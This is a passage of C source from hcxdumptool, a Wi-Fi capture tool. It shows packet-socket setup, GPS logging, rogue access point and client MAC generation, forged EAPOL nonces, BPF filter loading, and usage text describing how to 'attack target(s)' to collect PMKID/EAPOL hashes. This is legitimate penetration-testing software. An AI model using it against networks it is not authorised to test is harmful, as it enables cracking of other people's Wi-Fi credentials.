false;\nmemset(&mrq, 0, sizeof(mrq));\nmrq.mr_ifindex = ifaktindex;\nmrq.mr_type = PACKET_MR_PROMISC;\nif(setsockopt(fd_socket_rx, SOL_PACKET, PACKET_ADD_MEMBERSHIP, &mrq, sizeof(mrq)) < 0) return false;\npriolen = sizeof(prioval);\nprioval = 20;\nif(setsockopt(fd_socket_rx, SOL_SOCKET, SO_PRIORITY, &prioval, priolen) < 0) return false;\n#if(LINUX_VERSION_CODE >= KERNEL_VERSION(4, 20, 0))\nif(setsockopt(fd_socket_rx, SOL_PACKET, PACKET_IGNORE_OUTGOING, &enable, sizeof(int)) < 0) fprintf(stderr, \"PACKET_IGNORE_OUTGOING is not supported by kernel\\nfalling back to validate radiotap header length\\n\");\n#endif\nif(bpf.len > 0)\n\t{\n\tif(setsockopt(fd_socket_rx, SOL_SOCKET, SO_ATTACH_FILTER, &bpf, sizeof(bpf)) < 0)\n\t\t{\n\t\tfprintf(stderr, \"failed to attach BPF (SO_ATTACH_FILTER): %s\\n\", strerror(errno));\n\t\t#ifdef HCXDEBUG\n\t\tfprintf(fh_debug, \"SO_ATTACH_FILTER failed: %s\\n\", strerror(errno));\n\t\t#endif\n\t\treturn false;\n\t\t}\n\t}\nmemset(&saddr, 0, sizeof(saddr));\nsaddr.sll_family = PF_PACKET;\nsaddr.sll_ifindex = ifaktindex;\nsaddr.sll_protocol = htons(ETH_P_ALL);\nsaddr.sll_halen = ETH_ALEN;\nsaddr.sll_pkttype = PACKET_OTHERHOST;\nif(bind(fd_socket_rx, (struct sockaddr*) &saddr, sizeof(saddr)) < 0) return false;\nif((socket_rx_flags = fcntl(fd_socket_rx, F_GETFL, 0)) < 0) return false;\nif(fcntl(fd_socket_rx, F_SETFL, socket_rx_flags | O_NONBLOCK) < 0) return false;\nwhile((!wanteventflag) || (c != 0))\n\t{\n\tpacketlen = read(fd_socket_rx, epb +EPB_SIZE, PCAPNG_SNAPLEN);\n\tif(packetlen == -1) break;\n\tc--;\n\t}\nreturn true;\n}\n/*===========================================================================*/\n/* GPS */\n#ifdef HCXNMEAOUT\nstatic bool open_nmea0183_file(char *hcxposoutname)\n{\nstatic int c;\nstatic struct stat statinfo;\nstatic char *hcxposfilename = NULL;\nstatic char hcxposname[PATH_MAX];\n\nif(hcxposoutname == NULL)\n\t{\n\tc = 0;\n\tsnprintf(hcxposname, PATH_MAX, \"%s.nmea\", timestring1);\n\twhile(stat(hcxposname, &statinfo) == 0)\n\t\t{\n\t\tsnprintf(hcxposname, PATH_MAX, \"%s-%02d.nmea\", timestring1, c);\n\t\tc++;\n\t\t}\n\thcxposfilename = hcxposname;\n\t}\nelse hcxposfilename = hcxposoutname;\nif((fd_hcxpos = open(hcxposfilename, O_WRONLY | O_CREAT, 0777)) < 0) return false;\nreturn true;\n}\n/*---------------------------------------------------------------------------*/\nstatic bool open_socket_gpsd(char *hcxposoutname)\n{\nstatic int socket_gps_flags;\nstatic struct sockaddr_in gpsd_addr;\nstatic const char *gpsd_enable_nmea = \"?WATCH={\\\"enable\\\":true,\\\"json\\\":false,\\\"nmea\\\":true}\";\n\nif((fd_gps = socket(AF_INET, SOCK_STREAM, 0)) < 0) return false;\nmemset(&gpsd_addr, 0, sizeof(struct sockaddr_in));\ngpsd_addr.sin_family = AF_INET;\ngpsd_addr.sin_port = htons(2947);\ngpsd_addr.sin_addr.s_addr = inet_addr(\"127.0.0.1\");\nif(connect(fd_gps, (struct sockaddr*) &gpsd_addr, sizeof(gpsd_addr)) < 0) return false;\nif(fcntl(fd_gps, F_SETFL, socket_gps_flags | O_NONBLOCK) < 0) return false;\nif(write(fd_gps, gpsd_enable_nmea, 47) != 47) return false;\nif(open_nmea0183_file(hcxposoutname) == false) return false;\nreturn true;\n}\n/*---------------------------------------------------------------------------*/\nstatic bool open_device_nmea0183(char *nmea0183name, char *hcxposoutname)\n{\nstatic struct termios tty;\n\nif((fd_gps = open(nmea0183name, O_RDONLY | O_NONBLOCK)) < 0) return false;\nif(flock(fd_gps, LOCK_EX) < 0) return false;\nif(tcgetattr(fd_gps, &tty) < 0) return false;\ntty.c_cflag &= ~PARENB; // Clear parity bit, disabling parity (most common)\ntty.c_cflag &= ~CSTOPB; // Clear stop field, only one stop bit used in communication (most common)\ntty.c_cflag &= ~CSIZE; // Clear all bits that set the data size\ntty.c_cflag |= CS8; // 8 bits per byte (most common)\ntty.c_cflag &= ~CRTSCTS; // Disable RTS/CTS hardware flow control (most common)\ntty.c_cflag |= CREAD | CLOCAL; // Turn on READ & ignore ctrl lines (CLOCAL = 1)\ntty.c_lflag &= ~ICANON;\ntty.c_lflag &= ~ECHO; // Disable echo\ntty.c_lflag &= ~ECHOE; // Disable erasure\ntty.c_lflag &= ~ECHONL; // Disable new-line echo\ntty.c_lflag &= ~ISIG; // Disable interpretation of INTR, QUIT and SUSP\ntty.c_iflag &= ~(IXON | IXOFF | IXANY); // Turn off s/w flow ctrl\ntty.c_iflag &= ~(IGNBRK|BRKINT|PARMRK|ISTRIP|INLCR|IGNCR|ICRNL); // Disable any special handling of received bytes\ntty.c_oflag &= ~OPOST; // Prevent special interpretation of output bytes (e.g. newline chars)\ntty.c_oflag &= ~ONLCR; // Prevent conversion of newline to carriage return/line feed\ntty.c_cc[VTIME] = 10;    // Wait for up to 1s (10 deciseconds), returning as soon as any data is received.\ntty.c_cc[VMIN] = 0;\ncfsetispeed(&tty, B9600);\ncfsetospeed(&tty, B9600);\nif (tcsetattr(fd_gps, TCSANOW, &tty) < 0) return false;\nif(open_nmea0183_file(hcxposoutname) == false) return false;\nreturn true;\n}\n#endif\n/*===========================================================================*/\n/* CONTROL SOCKETS */\nstatic void close_sockets(void)\n{\nif(fd_socket_unix != 0) close(fd_socket_unix);\nif(fd_socket_rt != 0) close(fd_socket_rt);\nif(fd_socket_nl != 0) close(fd_socket_nl);\nif(fd_socket_tx != 0) close(fd_socket_tx);\nif(bpf.filter != NULL)\n\t{\n\tif(fd_socket_rx > 0) setsockopt(fd_socket_rx, SOL_SOCKET, SO_DETACH_FILTER, &bpf, sizeof(bpf));\n\tfree(bpf.filter);\n\t}\nif(fd_socket_rx != 0) close(fd_socket_rx);\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic bool open_socket_unix(void)\n{\nif((fd_socket_unix = socket(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0)) < 0) return false;\nreturn true;\n}\n/*---------------------------------------------------------------------------*/\nstatic bool open_socket_rt(void)\n{\nstatic struct sockaddr_nl saddr;\nstatic int nltxbuffsize = NLTX_SIZE;\nstatic int nlrxbuffsize = NLRX_SIZE;\n\nif((fd_socket_rt = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_ROUTE)) < 0) return false;\nif(setsockopt(fd_socket_rt, SOL_SOCKET, SO_SNDBUF, &nltxbuffsize, sizeof(nltxbuffsize)) < 0) return false;\nif(setsockopt(fd_socket_rt, SOL_SOCKET, SO_RCVBUF, &nlrxbuffsize, sizeof(nlrxbuffsize)) < 0) return false;\nmemset(&saddr, 0, sizeof(saddr));\nsaddr.nl_family = AF_NETLINK;\nsaddr.nl_pid = getpid();\nif(bind(fd_socket_rt, (struct sockaddr *)&saddr, sizeof(saddr)) < 0) return false;\nreturn true;\n}\n/*---------------------------------------------------------------------------*/\nstatic bool open_socket_nl(void)\n{\nstatic struct sockaddr_nl saddr;\nstatic int nltxbuffsize = NLTX_SIZE;\nstatic int nlrxbuffsize = NLRX_SIZE;\n\nif((fd_socket_nl = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_GENERIC)) < 0) return false;\nif(setsockopt(fd_socket_nl, SOL_SOCKET, SO_SNDBUF, &nltxbuffsize, sizeof(nltxbuffsize)) < 0) return false;\nif(setsockopt(fd_socket_nl, SOL_SOCKET, SO_RCVBUF, &nlrxbuffsize, sizeof(nlrxbuffsize)) < 0) return false;\nif(fcntl(fd_socket_nl, F_SETFL, O_NONBLOCK) < 0) return false;\nmemset(&saddr, 0, sizeof(saddr));\nsaddr.nl_family = AF_NETLINK;\nsaddr.nl_pid = hcxpid;\nif(bind(fd_socket_nl, (struct sockaddr *)&saddr, sizeof(saddr)) < 0) return false;\nreturn true;\n}\n/*===========================================================================*/\nstatic bool open_control_sockets(void)\n{\nif(open_socket_rt() == false) return false;\nif(open_socket_nl() == false) return false;\nif(open_socket_unix() == false) return false;\nreturn true;\n}\n/*===========================================================================*/\n/* TIMER */\nstatic bool set_timer(void)\n{\nstatic struct itimerspec tval1;\n\nif((fd_timer1 = timerfd_create(CLOCK_BOOTTIME, 0)) < 0) return false;\ntval1.it_value.tv_sec = TIMER1_VALUE_SEC;\ntval1.it_value.tv_nsec = TIMER1_VALUE_NSEC;\ntval1.it_interval.tv_sec = TIMER1_INTERVAL_SEC;\ntval1.it_interval.tv_nsec = TIMER1_INTERVAL_NSEC;\nif(timerfd_settime(fd_timer1, 0, &tval1, NULL) == -1) return false;\nreturn true;\n}\n/*---------------------------------------------------------------------------*/\nstatic bool set_timer_rca(void)\n{\nstatic struct itimerspec tval1;\n\nif((fd_timer1 = timerfd_create(CLOCK_BOOTTIME, 0)) < 0) return false;\ntval1.it_value.tv_sec = TIMER_RCA_VALUE_SEC;\ntval1.it_value.tv_nsec = TIMER_RCA_VALUE_NSEC;\ntval1.it_interval.tv_sec = TIMER_RCA_INTERVAL_SEC;\ntval1.it_interval.tv_nsec = TIMER_RCA_INTERVAL_NSEC;\nif(timerfd_settime(fd_timer1, 0, &tval1, NULL) == -1) return false;\nreturn true;\n}\n/*===========================================================================*/\n/* SIGNALHANDLER */\nstatic void signal_handler(int signum)\n{\nif((signum == SIGINT) || (signum == SIGTERM) || (signum == SIGKILL) || (signum == SIGTSTP)) wanteventflag |= EXIT_ON_SIGTERM;\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic bool set_signal_handler(void)\n{\nstruct sigaction sa;\n\nsa.sa_handler = signal_handler;\nsigemptyset(&sa.sa_mask);\nsa.sa_flags = SA_RESTART;\nif(sigaction(SIGINT, &sa, NULL) < 0) return false;\nif(sigaction(SIGTERM, &sa, NULL) < 0) return false;\nif(sigaction(SIGTSTP, &sa, NULL) < 0) return false;\nreturn true;\n}\n/*===========================================================================*/\nstatic void init_values(void)\n{\nstatic size_t i;\nstatic struct timespec waitfordevice;\n\nwaitfordevice.tv_sec = 1;\nwaitfordevice.tv_nsec = 0;\nclock_gettime(CLOCK_REALTIME, &tspecakt);\ntsfirst = ((u64)tspecakt.tv_sec * 1000000000ULL) + tspecakt.tv_nsec;\nnanosleep(&waitfordevice, NULL);\nclock_gettime(CLOCK_REALTIME, &tspecakt);\ntsakt = ((u64)tspecakt.tv_sec * 1000000000ULL) + tspecakt.tv_nsec;\ntshold = ((u64)tspecakt.tv_sec * 1000000000ULL) + tspecakt.tv_nsec;\nstrftime(timestring1, TIMESTRING_LEN, \"%Y%m%d%H%M%S\", localtime(&tspecakt.tv_sec));\nseed += (unsigned int)tspecakt.tv_nsec & 0xffffffff;\nsrand(seed);\nouiaprg = (vendoraprg[rand() % ((VENDORAPRG_SIZE / sizeof(int)))]) &0xffffff;\nnicaprg = rand() & 0xffffff;\nmacaprghidden[5] = nicaprg & 0xff;\nmacaprghidden[4] = (nicaprg >> 8) & 0xff;\nmacaprghidden[3] = (nicaprg >> 16) & 0xff;\nmacaprghidden[2] = ouiaprg & 0xff;\nmacaprghidden[1] = (ouiaprg >> 8) & 0xff;\nmacaprghidden[0] = (ouiaprg >> 16) & 0xff;\nnicaprg++;\nmacaprg[5] = nicaprg & 0xff;\nmacaprg[4] = (nicaprg >> 8) & 0xff;\nmacaprg[3] = (nicaprg >> 16) & 0xff;\nmacaprg[2] = ouiaprg & 0xff;\nmacaprg[1] = (ouiaprg >> 8) & 0xff;\nmacaprg[0] = (ouiaprg >> 16) & 0xff;\nouiclientrg = (vendorclientrg[rand() % ((VENDORCLIENTRG_SIZE / sizeof(int)))]) &0xffffff;\nnicclientrg = rand() & 0xffffff;\nmacclientrg[7] = 0;\nmacclientrg[6] = 0;\nmacclientrg[5] = nicclientrg & 0xff;\nmacclientrg[4] = (nicclientrg >> 8) & 0xff;\nmacclientrg[3] = (nicclientrg >> 16) & 0xff;\nmacclientrg[2] = ouiclientrg & 0xff;\nmacclientrg[1] = (ouiclientrg >> 8) & 0xff;\nmacclientrg[0] = (ouiclientrg >> 16) & 0xff;\nstrncpy(weakcandidate, WEAKCANDIDATEDEF, PSK_MAX);\nreplaycountrg = (rand() % 0xfff) + 0xf000;\neapolm1data[0x17] = (replaycountrg >> 8) &0xff;\neapolm1data[+0x18] = replaycountrg &0xff;\nfor(i = 0; i < 32; i++)\n\t{\n\tanoncerg[i] = rand() % 0xff;\n\teapolm1data[i + 0x19] = anoncerg[i];\n\tsnoncerg[i] = rand() % 0xff;\n\t}\npacketptr = &epb[EPB_SIZE];\nmemcpy(&wltxbuffer, &rthtxdata, RTHTX_SIZE);\nmemcpy(&epbown[EPB_SIZE], &rthtxdata, RTHTX_SIZE);\n#ifdef HCXNMEAOUT\nmemcpy(&gpwpl, &gpwplid, NMEA_GPWPLID_SIZE);\nmemcpy(&gptxt, &gptxtid, NMEA_GPTXTID_SIZE);\n#endif\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic void close_lists(void)\n{\nstatic size_t i;\n\nif(maclist != NULL) free(maclist);\nif(clientlist != NULL) free(clientlist);\nif(aprglist != NULL) free(aprglist);\nif(aplist != NULL) free(aplist);\nif(scanlist != NULL) free(scanlist);\nif(ifpresentlist != NULL)\n\t{\n\tfor(i = 0; i < INTERFACELIST_MAX; i++)\n\t\t{\n\t\tif((ifpresentlist +i)->frequencylist != NULL) free((ifpresentlist +i)->frequencylist);\n\t\t}\n\tfree(ifpresentlist);\n\t}\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic void close_fds(void)\n{\nif(fd_timer1 != 0) close(fd_timer1);\nif(fd_pcapng != 0) close(fd_pcapng);\n#ifdef HCXNMEAOUT\nif(fd_gps != 0) close(fd_gps);\nif(fd_hcxpos != 0) close(fd_hcxpos);\n#endif\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic bool init_lists(void)\n{\nssize_t i;\n\nif((scanlist = (frequencylist_t*)calloc(SCANLIST_MAX, FREQUENCYLIST_SIZE)) == NULL) return false;\nif((aplist = (aplist_t*)calloc(APLIST_MAX, APLIST_SIZE)) == NULL) return false;\nif((aprglist = (aprglist_t*)calloc(APRGLIST_MAX, APRGLIST_SIZE)) == NULL) return false;\nif((clientlist = (clientlist_t*)calloc(CLIENTLIST_MAX, CLIENTLIST_SIZE)) == NULL) return false;\nif((maclist = (maclist_t*)calloc(MACLIST_MAX, MACLIST_SIZE)) == NULL) return false;\nif((ifpresentlist = (interface_t*)calloc(INTERFACELIST_MAX, INTERFACELIST_SIZE)) == NULL) return false;\nfor(i = 0; i < INTERFACELIST_MAX; i++)\n\t{\n\tif(((ifpresentlist +i)->frequencylist = (frequencylist_t*)calloc(FREQUENCYLIST_MAX, FREQUENCYLIST_SIZE)) == NULL) return false;\n\t}\nreturn true;\n}\n/*===========================================================================*/\nstatic size_t chop(char *buffer, size_t len)\n{\nchar *ptr = NULL;\n\nptr = buffer +len - 1;\nwhile(len)\n\t{\n\tif(*ptr != '\\n') break;\n\t*ptr-- = 0;\n\tlen--;\n\t}\nwhile(len)\n\t{\n\tif(*ptr != '\\r') break;\n\t*ptr-- = 0;\n\tlen--;\n\t}\nreturn len;\n}\n/*---------------------------------------------------------------------------*/\nstatic int fgetline(FILE *inputstream, size_t size, char *buffer)\n{\nsize_t len = 0;\nchar *buffptr = NULL;\n\nif(feof(inputstream)) return -1;\nbuffptr = fgets(buffer, size, inputstream);\nif(buffptr == NULL) return -1;\nlen = strlen(buffptr);\nlen = chop(buffptr, len);\nreturn len;\n}\n/*===========================================================================*/\nstatic bool read_bpf(char *bpfname)\n{\nstatic int len;\nstatic struct sock_filter *bpfptr;\nstatic FILE *fh_filter;\nstatic char linein[128];\n\nif((fh_filter = fopen(bpfname, \"r\")) == NULL) return false;\nbpf.filter = (struct sock_filter*)calloc(BPF_MAXINSNS, sizeof(struct sock_filter));\nbpf.len = 0;\nbpfptr = bpf.filter;\nwhile(bpf.len < BPF_MAXINSNS +1)\n\t{\n\tif((len = fgetline(fh_filter, 128, linein)) == -1) break;\n\tif(bpf.len == BPF_MAXINSNS)\n\t\t{\n\t\tbpf.len = 0;\n\t\tbreak;\n\t\t}\n\tif(len < 7) continue;\n\tif(linein[0] != '{')\n\t\t{\n\t\tif(sscanf(linein, \"%\" SCNu16 \"%\" SCNu8 \"%\" SCNu8 \"%\" SCNu32, &bpfptr->code, &bpfptr->jt, &bpfptr->jf, &bpfptr->k) != 4)\n\t\t\t{\n\t\t\tbpf.len = 0;\n\t\t\tbreak;\n\t\t\t}\n\t\t}\n\telse\n\t\t{\n\t\tif(sscanf(linein, \"{ %\" SCNx16 \", %\"  SCNu8 \", %\" SCNu8 \", %\" SCNx32 \" },\",&bpfptr->code, &bpfptr->jt, &bpfptr->jf, &bpfptr->k) != 4)\n\t\t\t{\n\t\t\tbpf.len = 0;\n\t\t\tbreak;\n\t\t\t}\n\t\t}\n\tbpfptr++;\n\tbpf.len++;\n\t}\nfclose(fh_filter);\nif(bpf.len == 0) return false;\nreturn true;\n}\n/*---------------------------------------------------------------------------*/\n#ifdef HCXWANTLIBPCAP\nstatic bool compile_bpf(char *bpfs)\n{\nstatic u16 i;\nstatic pcap_t *hpcap = NULL;\nstatic struct bpf_program bpfp;\nstruct bpf_insn *bpfins;\n\nif((hpcap = pcap_open_dead(DLT_IEEE802_11_RADIO, PCAPNG_SNAPLEN)) == NULL)\n\t{\n\tfprintf(stderr, \"to 0pen libpcap\\n\");\n\treturn false;\n}\t\nif(pcap_compile(hpcap, &bpfp, bpfs, 1, 0))\n\t{\n\tfprintf(stderr, \"failed to compile BPF\\n\");\n\treturn false;\n\t}\nbpfins = bpfp.bf_insns;\nfor(i = 0; i < bpfp.bf_len; ++bpfins, ++i) fprintf(stdout, \"%u %u %u %u\\n\", bpfins->code, bpfins->jt, bpfins->jf, bpfins->k);\npcap_freecode(&bpfp);\nreturn true;\n}\n#endif\n/*---------------------------------------------------------------------------*/\nstatic void read_essidlist(char *listname)\n{\nstatic size_t i;\nstatic int len;\nstatic FILE *fh_essidlist;\nstatic char linein[ESSID_MAX];\n\nif((fh_essidlist = fopen(listname, \"r\")) == NULL)\n\t{\n\tfprintf(stderr, \"failed to open ESSID list %s\\n\", listname);\n\treturn;\n\t}\ni = 0;\nwhile(i < (APRGLIST_MAX - 1))\n\t{\n\tif((len = fgetline(fh_essidlist, ESSID_MAX, linein)) == -1) break;\n\tif((len == 0) || (len > ESSID_MAX)) continue;\n\t(aprglist +i)->tsakt = tsakt -i;\n\t(aprglist +i)->essidlen = len;\n\tmemcpy((aprglist +i)->essid, linein, len);\n\t(aprglist +i)->macaprg[5] = nicaprg & 0xff;\n\t(aprglist +i)->macaprg[4] = (nicaprg >> 8) & 0xff;\n\t(aprglist +i)->macaprg[3] = (nicaprg >> 16) & 0xff;\n\t(aprglist +i)->macaprg[2] = ouiaprg & 0xff;\n\t(aprglist +i)->macaprg[1] = (ouiaprg >> 8) & 0xff;\n\t(aprglist +i)->macaprg[0] = (ouiaprg >> 16) & 0xff;\n\tnicaprg++;\n\ti++;\n\t}\n(aprglist +i)->essidlen = 0;\nfclose(fh_essidlist);\nreturn;\n}\n/*===========================================================================*/\n/*===========================================================================*/\n/* RASPBERRY PI */\nstatic bool init_rpi(void)\n{\nstatic FILE *modinfo;\nstatic FILE *procinfo;\nstatic int fd_devinfo;\nstatic int len = 0;\nstatic unsigned int gpioperibase = 0;\nstatic char linein[RASPBERRY_INFO] = { 0 };\n\ngpio_map = MAP_FAILED;\nif((modinfo = fopen(\"/proc/device-tree/model\", \"r\")) == NULL)\n\t{\n\tperror(\"failed to get model information\");\n\treturn false;\n\t}\nlen = fgetline(modinfo, RASPBERRY_INFO, linein);\nfclose(modinfo);\nif(len < RPINAME_SIZE) return false;\nif(memcmp(rpiname, linein, RPINAME_SIZE) != 0) return false;\nif((procinfo = fopen(\"/proc/cpuinfo\", \"r\")) != NULL)\n\t{\n\twhile(1)\n\t\t{\n\t\tif((len = fgetline(procinfo, RASPBERRY_INFO, linein)) == -1) break;\n\t\tif(len > 8)\n\t\t\t{\n\t\t\tif(strstr(linein, \"Serial\") != NULL)\n\t\t\t\t{\n\t\t\t\tif(len > 8) seed += strtoul(&linein[len - 6], NULL, 16);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\tfclose(procinfo);\n\t}\nif((fd_devinfo = open(\"/dev/gpiomem\", O_RDWR | O_SYNC)) > 0)\n\t{\n\tgpio_map = mmap(NULL, RPI_BLOCK_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd_devinfo, gpioperibase);\n\tclose(fd_devinfo);\n\t}\nelse\n\t{\n\tif((procinfo = fopen(\"/proc/iomem\", \"r\")) != NULL)\n\t\t{\n\t\twhile(1)\n\t\t\t{\n\t\t\tif((len = fgetline(procinfo, RASPBERRY_INFO, linein)) == -1) break;\n\t\t\tif(strstr(linein, \".gpio\") != NULL)\n\t\t\t\t{\n\t\t\t\tif(linein[8] != '-') break;\n\t\t\t\t\t{\n\t\t\t\t\tlinein[8] = 0;\n\t\t\t\t\tgpioperibase = strtoul(linein, NULL, 16);\n\t\t\t\t\tif(gpioperibase != 0)\n\t\t\t\t\t\t{\n\t\t\t\t\t\tif((fd_devinfo = open(\"/dev/mem\", O_RDWR | O_SYNC)) > 0)\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\tgpio_map = mmap(NULL, RPI_BLOCK_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd_devinfo, gpioperibase);\n\t\t\t\t\t\t\tclose(fd_devinfo);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\tfclose(procinfo);\n\t\t}\n\t}\nif(gpio_map == MAP_FAILED)\n\t{\n\tfprintf(stderr, \"failed to map GPIO memory\\n\");\n\treturn false;\n\t}\ngpio = (volatile unsigned *)gpio_map;\nif(gpiostatusled > 0)\n\t{\n\tINP_GPIO(gpiostatusled);\n\tOUT_GPIO(gpiostatusled);\n\t}\nif(gpiobutton > 0) INP_GPIO(gpiobutton);\nreturn true;\n}\n/*===========================================================================*/\n/*===========================================================================*/\n__attribute__ ((noreturn))\nstatic inline void version(char *eigenname)\n{\nstruct utsname utsbuffer;\n\nfprintf(stdout, \"%s %s (C) %s ZeroBeat\\n\", eigenname, VERSION_TAG, VERSION_YEAR);\nif(uname(&utsbuffer) == 0) fprintf(stdout, \"running on Linux kernel %s\\n\", utsbuffer.release);\n#if defined (__GLIBC__)\nfprintf(stdout, \"running GNU libc version %s\\n\", gnu_get_libc_version());\n#endif\n#if defined(__GNUC__) && !defined(__clang__)\nfprintf(stdout, \"compiled by gcc %d.%d.%d\\n\", __GNUC__, __GNUC_MINOR__, __GNUC_PATCHLEVEL__);\n#elif defined(__clang__)\nfprintf(stdout, \"compiled by clang %d.%d.%d\\n\", __clang_major__, __clang_minor__, __clang_patchlevel__);\n#else\nfprintf(stdout, \"compiler (__clang__ / __GNUC__) is not defined\\n\");\n#endif\n#if defined (LINUX_VERSION_MAJOR)\nfprintf(stdout, \"compiled with Linux API headers %d.%d.%d\\n\", LINUX_VERSION_MAJOR, LINUX_VERSION_PATCHLEVEL, LINUX_VERSION_SUBLEVEL);\n#else\nfprintf(stdout, \"Linux API headers (LINUX_VERSION_MAJOR) is not defined\\n\");\n#endif\n#if defined (__GLIBC__)\nfprintf(stdout, \"compiled with GNU libc headers %d.%d\\n\", __GLIBC__, __GLIBC_MINOR__);\n#else\nfprintf(stdout, \"glibc (__GLIBC_MINOR__) is not defined\\n\");\n#endif\n#ifdef HCXSTATUSOUT\nfprintf(stdout, \"enabled REALTIME DISPLAY\\n\");\n#else\nfprintf(stdout, \"disabled REALTIME DISPLAY\\n\");\n#endif\n#ifdef HCXNMEAOUT\nfprintf(stdout, \"enabled GPS support\\n\");\n#else\nfprintf(stdout, \"disabled GPS support\\n\");\n#endif\n#ifdef HCXWANTLIBPCAP\nfprintf(stdout, \"enabled BPF compiler\\n\");\n#else\nfprintf(stdout, \"disabled BPF compiler\\n\");\n#endif\n#ifdef HCXDEBUG\nfprintf(stdout, \"running in debug mode\\n\");\n#endif\nexit(EXIT_SUCCESS);\n}\n/*---------------------------------------------------------------------------*/\n__attribute__ ((noreturn))\nstatic inline void usage_additional(char *eigenname)\n{\nfprintf(stdout, \"%s %s  (C) %s ZeroBeat\\n\"\n\t\"Additional information:\\n-----------------------\\n\"\n\t\"get information about running services that have access to the device:\\n\"\n\t\" $ sudo systemctl --type=service --state=running\\n\"\n\t\"stop all services that have access to the interface, e.g.:\\n\"\n\t\" $ sudo systemctl stop NetworkManager.service\\n\"\n\t\" $ sudo systemctl stop wpa_supplicant.service\\n\"\n\t\"run %s - it will set an appropriate monitor mode\\n\"\n\t\" scan for ACCESS POINTS in range (packets are not stored to dump file, not in combination with attack modes)\\n\"\n\t\"  $ %s -i INTERFACENAME -F --rcascan=active\\n\"\n\t\" attack target(s) (not in combination with rcascan)\\n\"\n\t\"  $ %s -i INTERFACENAME -w dumpfile.pcapng -F --rds=1\\n\"\n\t\"   i     : name of the interface to be used\\n\"\n\t\"   w     : name of file to which packets are written\\n\"\n\t\"   F     : use all available channels\\n\"\n\t\"   rds=1 : sort real time display by status (last PMKID/EAPOL on top)\\n\"\n\t\"press ctrl+c to terminate\\n\"\n\t\"press GPIO button to terminate\\n\"\n\t\" hardware modification is necessary, read more:\\n\"\n\t\" https://github.com/ZerBea/hcxdumptool/tree/master/docs\\n\"\n\t\"to store entire traffic, run tshark in parallel on the same interface:\\n\"\n\t\" $ tshark -i <interface> -w allframes.pcapng\\n\"\n\t\"\\n\"\n\t\"Berkeley Packet Filter:\\n\"\n\t\"-----------------------\\n\"\n\t\"tcpdump decimal numper format:\\n\"\n\t\" example: tcpdump high level compiler:\\n\"\n\t\"  $ tcpdump -s %d -y IEEE802_11_RADIO wlan addr3 112233445566 -ddd > filter.bpf\\n\"\n\t\"  see man pcap-filter\\n\"\n\t\" example: bpf_asm low level compiler\\n\"\n\t\"  $ bpf_asm filter.asm | tr ',' '\\\\n' > filter.bpf\\n\"\n\t\"  see https://www.kernel.org/doc/html/latest/networking/filter.html\\n\"\n\t\" example: bpfc low level compiler:\\n\"\n\t\"  $ bpfc -f tcpdump -i filter.asm > filter.bpf\\n\"\n\t\"  see man bpfc\\n\"\n\t\"tcpdump C style format:\\n\"\n\t\" example: tcpdump high level compiler:\\n\"\n\t\"  $ tcpdump -s %d -y IEEE802_11_RADIO wlan addr3 112233445566 -dd > filter.bpf\\n\"\n\t\"  see man pcap-filter\\n\"\n\t\" example: bpfc low level compiler:\\n\"\n\t\"  $ bpfc -f C -i filter.asm > filter.bpf\\n\"\n\t\"  see man bpfc\\n\"\n\t\"\\n\"\n\t\"Important recommendation:\\n\"\n\t\"-------------------------\\n\"\n\t\"Do not set monitor mode by third party tools or third party scripts!\\n\"\n\t\"Do not use virtual interfaces (monx, wlanxmon, prismx, ...)!\\n\"\n\t\"Do not use virtual machines or emulators!\\n\"\n\t\"Do not run other tools that take access to the interface in parallel (except: tshark, wireshark, tcpdump)!\\n\"\n\t\"Do not use tools to change the virtual MAC (like macchanger)!\\n\"\n\t\"Do not merge (pcapng) dump files, because this destroys assigned hash values!\\n\"\n\t\"\\n\",\n\teigenname, VERSION_TAG, VERSION_YEAR, eigenname, eigenname, eigenname, PCAPNG_SNAPLEN, PCAPNG_SNAPLEN);\nexit(EXIT_SUCCESS);\n}\n/*---------------------------------------------------------------------------*/\n__attribute__ ((noreturn))\nstatic inline void usage(char *eigenname)\n{\nfprintf(stdout, \"%s %s  (C) %s ZeroBeat\\n\"\n\t\"usage: %s <options>\\n\"\n\t\"\\n\"\n\t\"most common options:\\n--------------------\\n\"\n\t\"-i <INTERFACE> : name of INTERFACE to be used\\n\"\n\t\"                  default: first suitable INTERFACE\\n\"\n\t\"                  warning:\\n\"\n\t\"                   %s changes the mode of the INTERFACE\\n\"\n\t\"                   %s changes the virtual MAC address of the INTERFACE\\n\"\n\t\"                   %s changes the channel of the INTERFACE\\n\"\n\t\"-w <outfile>   : write packets to a pcapng-format file named <outfile>\\n\"\n\t\"                  existing file will be overwritten\\n\" \n\t\"                  default outfile name: yyyyddmmhhmmss-interfacename.pcapng\\n\"\n\t\"                  existing file will not be overwritten\\n\" \n\t\"                  get more information: https://pcapng.com/\\n\"\n\t\"-c <digit>     : set channel (1a,2a,36b,...)\\n\"\n\t\"                  default: 1a,6a,11a\\n\"\n\t\"                  important notice: channel numbers are not unique\\n\"\n\t\"                  it is mandatory to add band information to the channel number (e.g. 12a)\\n\"\n\t\"                   band a: NL80211_BAND_2GHZ\\n\"\n\t\"                   band b: NL80211_BAND_5GHZ\\n\"\n\t#if(LINUX_VERSION_CODE >= KERNEL_VERSION(5, 10, 0))\n\t\"                   band c: NL80211_BAND_6GHZ\\n\"\n\t\"                   band d: NL80211_BAND_60GHZ\\n\"\n\t\"                   band e: NL80211_BAND_S1GHZ (902 MHz)\\n\"\n\t#endif\n\t\"                  to disable frequency management, set this option to a single frequency/channel\\n\"\n\t\"-f <digit>     : set frequency (2412,2417,5180,...)\\n\"\n\t\"-F             : use all available frequencies from INTERFACE\\n\"\n\t\"-t <second>    : minimum stay time (will increase on new stations and/or authentications)\\n\"\n\t\"                  default 